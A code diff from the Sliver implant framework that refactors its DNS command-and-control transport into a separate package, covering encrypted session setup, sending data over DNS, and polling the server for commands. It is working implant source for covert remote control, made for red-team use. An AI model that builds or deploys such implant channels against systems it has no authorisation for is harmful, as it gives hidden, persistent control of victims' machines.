@@ -1,4 +1,4 @@
-package transports
+package dnsclient
 
 /*
 	Sliver Implant Framework
@@ -45,6 +45,7 @@ import (
 	"time"
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
+	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
@@ -228,25 +229,25 @@ func dnsDomainSeq(seq int) []byte {
 
 // --------------------------- DNS SESSION START ---------------------------
 
-func dnsStartSession(parentDomain string) (string, AESKey, error) {
-	sessionKey := RandomAESKey()
+func DnsConnect(parentDomain string) (string, cryptography.AESKey, error) {
+	sessionKey := cryptography.RandomAESKey()
 
 	pubKey := dnsGetServerPublicKey(parentDomain)
 	if pubKey == nil {
-		return "", AESKey{}, errors.New("pubkey required for new DNS session")
+		return "", cryptography.AESKey{}, errors.New("pubkey required for new DNS session")
 	}
 	dnsSessionInit := &pb.DNSSessionInit{
 		Key: sessionKey[:],
 	}
 	data, _ := proto.Marshal(dnsSessionInit)
-	encryptedData, err := RSAEncrypt(data, pubKey)
+	encryptedData, err := cryptography.RSAEncrypt(data, pubKey)
 	if err != nil {
-		return "", AESKey{}, err
+		return "", cryptography.AESKey{}, err
 	}
 
 	encryptedSessionID, err := dnsSend(parentDomain, sessionInitMsg, "_", encryptedData)
 	if err != nil {
-		return "", AESKey{}, errors.New("Failed to start new DNS session (sessionInitMsg send failed)")
+		return "", cryptography.AESKey{}, errors.New("failed to start new DNS session (sessionInitMsg send failed)")
 	}
 	// {{if .Config.Debug}}
 	log.Printf("Encrypted session id = %s", encryptedSessionID)
@@ -256,11 +257,11 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Session ID decode error %v", err)
 		// {{end}}
-		return "", AESKey{}, errors.New("Failed to decode session id")
+		return "", cryptography.AESKey{}, errors.New("failed to decode session id")
 	}
-	sessionID, err := GCMDecrypt(sessionKey, encryptedSessionIDData)
+	sessionID, err := cryptography.GCMDecrypt(sessionKey, encryptedSessionIDData)
 	if err != nil {
-		return "", AESKey{}, errors.New("Failed to decrypt session id")
+		return "", cryptography.AESKey{}, errors.New("failed to decrypt session id")
 	}
 
 	return string(sessionID), sessionKey, nil
@@ -287,7 +288,7 @@ func dnsGetServerPublicKey(dnsParent string) *rsa.PublicKey {
 	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
 	// {{end}}
 
-	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
+	certErr := cryptography.RootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
 		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
 		return cert.PublicKey.(*rsa.PublicKey)
@@ -324,7 +325,7 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 
 // --------------------------- DNS SESSION SEND ---------------------------
 
-func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AESKey, envelope *pb.Envelope) {
+func SendEnvelope(parentDomain string, sessionID string, sessionKey cryptography.AESKey, envelope *pb.Envelope) {
 
 	envelopeData, err := proto.Marshal(envelope)
 	if err != nil {
@@ -334,7 +335,7 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 		return
 	}
 
-	encryptedEnvelope, err := GCMEncrypt(sessionKey, envelopeData)
+	encryptedEnvelope, err := cryptography.GCMEncrypt(sessionKey, envelopeData)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to encrypt session envelope %v", err)
@@ -351,14 +352,14 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 }
 
 // --------------------------- DNS SESSION RECV ---------------------------
-
-func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
+// Poll - Poll the server for new commands
+func Poll(parentDomain string, sessionID string, sessionKey cryptography.AESKey, pollInterval time.Duration, ctrl chan bool, recv chan *pb.Envelope) {
 	error_counter := 0
 	for {
 		select {
 		case <-ctrl:
 			return
-		case <-time.After(GetPollInterval()):
+		case <-time.After(pollInterval):
 			nonce := dnsNonce(nonceStdSize)
 			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
 			txt, err := dnsLookup(domain)
@@ -385,7 +386,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			if isReplayAttack(rawTxt) {
 				break
 			}
-			pollData, err := GCMDecrypt(sessionKey, rawTxt)
+			pollData, err := cryptography.GCMDecrypt(sessionKey, rawTxt)
 			if err != nil {
 				strTxt := string(rawTxt[:])
 				// {{if .Config.Debug}}
@@ -419,7 +420,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 }
 
 // Poll returned the server has a message for us, fetch the entire envelope
-func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
+func getSessionEnvelope(parentDomain string, sessionKey cryptography.AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
 	blockData, err := getBlock(parentDomain, blockPtr.ID, fmt.Sprintf("%d", blockPtr.Size))
 	if err != nil || isReplayAttack(blockData) {
 		// {{if .Config.Debug}}
@@ -427,7 +428,7 @@ func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNS
 		// {{end}}
 		return nil
 	}
-	envelopeData, err := GCMDecrypt(sessionKey, blockData)
+	envelopeData, err := cryptography.GCMDecrypt(sessionKey, blockData)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.ID, err)
@@ -494,7 +495,7 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 		// {{if .Config.Debug}}
 		log.Printf("Failed to decode block")
 		// {{end}}
-		return nil, errors.New("Failed to decode block")
+		return nil, errors.New("failed to decode block")
 	}
 
 	nonce := dnsNonce(nonceStdSize)
